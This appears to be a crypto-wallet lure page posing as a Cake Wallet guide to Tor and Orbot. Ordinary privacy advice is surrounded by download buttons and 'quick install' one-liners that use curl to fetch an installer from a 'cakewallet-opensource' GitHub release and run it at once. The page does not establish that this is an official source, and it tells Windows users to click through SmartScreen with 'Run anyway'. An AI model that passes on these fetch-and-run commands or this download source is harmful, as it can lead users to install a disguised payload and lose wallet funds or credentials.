![Cake Wallet tor orbot guide](assets/cake-wallet-tor-orbot-article-banner.png)

# Use Tor With Cake Wallet and Orbot

What Tor hides, what it does not, and which switch to use where.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Enable the built-in Tor option in the app's network settings, or route through Orbot on Android where that is the documented path. Tor hides your IP address from the node and the network, and does nothing for on-chain privacy. If the app closes when Tor is on, update before anything else.

<!-- ARTICLE-BODY-BEGIN -->

## Install a current build
Tor handling has changed across releases, and a build that is behind is the most common cause of a Tor startup crash. Install the current release over your existing install, keeping your wallet, and try the switch again.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a>. If the app still closes with Tor enabled, the next step is the platform's requirement: Orbot on Android, the system proxy on desktop.

## Built-in Tor vs Orbot
The app can carry its own Tor client, and on Android the documented alternative is Orbot, which provides Tor for the whole device. Built-in Tor keeps the setting inside the wallet; Orbot covers other apps too and is more visible to the operating system.

Neither changes what the node learns about your addresses, only where the connection comes from. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md">Cake Wallet safety and custody</a> keeps that distinction clear: this is network privacy, not key custody.

## When Tor slows everything down
Every request takes a longer path, so syncs are slower and a first Monero sync can feel stalled. That is expected. If the connection times out entirely, the node may refuse Tor connections, which is a reason to switch nodes rather than to disable Tor.

A node that works without Tor and fails with it is telling you about the node, not about your setup. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-change-node.md">Change your Cake Wallet node</a> covers how to pick one that accepts the connection.

## Privacy beyond the network layer
Tor hides who is asking. It does not hide what is on the chain: on Bitcoin, a transaction is still public and linkable, and Tor does nothing about that.

If the goal is on-chain privacy rather than connection privacy, the tools are different. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-silent-payments.md">Silent Payments in Cake Wallet</a> covers one Bitcoin approach, where a published address no longer accumulates on-chain.

## If it still fails
Turn Tor off, confirm the wallet works, then turn it back on and watch the first request. A failure that appears only at startup is usually the Tor bootstrap failing to reach a relay, which resolves with time or a different network.

Do not reinstall while funds are on the device. Restore is the safe reset, and it costs you only the resync.

## FAQ
### What is Orbot and do I need it?
Orbot provides Tor on Android for the whole device. It is the documented option where built-in Tor is not available; you do not need both.
### Why does the app close when Tor is on?
Older builds had a startup crash with built-in Tor that has since been fixed. Update first; then check the platform's Tor requirement.
### Which version fixed the Tor crash?
A later release in the current line fixed it. Use the current release rather than the one that crashes.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet safety and custody](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md) · [Silent Payments in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-silent-payments.md) · [change your Cake Wallet node](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-change-node.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
